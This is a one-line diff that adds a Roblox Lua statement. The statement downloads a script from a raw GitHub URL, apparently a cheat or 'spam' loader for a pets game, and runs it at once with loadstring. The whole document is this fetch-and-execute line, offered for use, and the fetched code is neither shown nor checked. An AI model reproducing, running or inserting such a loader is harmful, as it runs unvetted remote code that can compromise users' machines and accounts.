@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/x3-pets-universe-spam7-v75w9izyl67cwe.lua"))()
